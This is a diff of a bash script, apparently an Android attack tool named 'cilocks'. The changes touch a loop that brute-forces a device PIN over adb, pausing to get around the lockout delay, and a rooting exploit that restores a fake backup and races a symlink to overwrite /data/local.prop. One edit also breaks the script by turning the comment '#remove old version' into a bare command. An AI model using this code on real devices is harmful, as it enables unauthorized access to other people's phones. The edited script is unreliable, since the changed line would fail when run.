@@ -90,7 +90,7 @@ clear
   ${n}"
   read -p "senpai@tegalsec:~# " select
 if [[ $select == 1 ]]; then
-  #remove old version
+  remove old version
   rm -f "${path}/cilocks" >/dev/null 2>&1
   rm -f "${path}/data/config" >/dev/null 2>&1
   rm -f "${path}/data/os" >/dev/null 2>&1
@@ -176,7 +176,13 @@ elif [[ $select == 4 ]]; then
 
       if ! (( `expr $i + 1` % 5 )); then
           adb shell input keyevent 66
-          echo "Delay Limit 30s
+          echo "Delay Limit 30s"
+          secs=$((1 * 30))
+          while [ $secs -gt 0 ]; do
+             echo -ne "$secs\033[0K\r"
+             sleep 1
+             : $((secs--))
+          done
 
           sleep 30
           adb shell input keyevent 82
@@ -200,7 +206,7 @@ fi
 elif [[ $select == 6 ]]; then
   adb restore modules/fakebackup.ab
 
-command "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99 2>/dev/null; do :; done; echo 'Overwrote local.prop!';"
+  command "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99 2>/dev/null; do :; done; echo 'Overwrote local.prop!';"
 
 if command "cat /data/local.prop"
 	then echo "Succesfully rooted!"
